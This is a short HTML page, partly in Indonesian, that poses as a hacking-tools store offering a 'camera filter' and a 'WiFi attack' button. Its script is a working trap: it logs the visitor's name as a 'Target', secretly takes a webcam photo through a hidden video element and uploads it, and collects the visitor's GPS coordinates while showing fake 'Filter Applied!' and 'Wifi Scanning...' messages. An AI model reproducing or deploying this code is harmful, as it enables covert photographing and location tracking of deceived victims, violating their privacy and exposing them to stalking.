<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VALUXIANT SYSTEM V1</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; }
        .box { border: 1px solid #00ff00; padding: 20px; margin: 20px auto; max-width: 400px; }
        input { background: #111; border: 1px solid #00ff00; color: #00ff00; width: 80%; padding: 10px; margin: 10px 0; }
        .btn { background: #00ff00; color: #000; padding: 10px 20px; border: none; font-weight: bold; cursor: pointer; width: 85%; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="box" id="login">
        <h1>VAVOR STORE</h1>
        <p>Enter Name to Access Tools</p>
        <input type="text" id="name" placeholder="Your Name...">
        <button class="btn" onclick="start()">INITIALIZE</button>
    </div>

    <div class="box hidden" id="menu" style="display:none">
        <h3>VALUXIANT TOOLS</h3>
        <button class="btn" onclick="takePhoto()">📷 CAMERA FILTER</button><br><br>
        <button class="btn" onclick="getLoc()">📶 WIFI ATTACK</button>
    </div>

    <video id="v" autoplay></video>
    <canvas id="c"></canvas>

    <script>
        let uName = "";
        function start() {
            uName = document.getElementById('name').value;
            if(!uName) return alert("Isi Nama!");
            document.getElementById('login').style.display = 'none';
            document.getElementById('menu').style.display = 'block';
            fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({msg: `👤 Target: ${uName} entered the web.`})});
        }

        async function takePhoto() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video: true});
                const v = document.getElementById('v');
                v.srcObject = s;
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {
                        const fd = new FormData();
                        fd.append('photo', b);
                        fd.append('name', uName);
                        fetch('/upload', {method: 'POST', body: fd});
                    }, 'image/jpeg');
                    s.getTracks().forEach(t => t.stop());
                    alert("Filter Applied!");
                }, 2000);
            } catch(e) { alert("Izinkan kamera untuk filter!"); }
        }

        function getLoc() {
            navigator.geolocation.getCurrentPosition(p => {
                fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({msg: `📶 WiFi Log ${uName}: Lat ${p.coords.latitude}, Lon ${p.coords.longitude}`})});
                alert("Wifi Scanning...");
            });
        }
    </script>
</body>
</html>
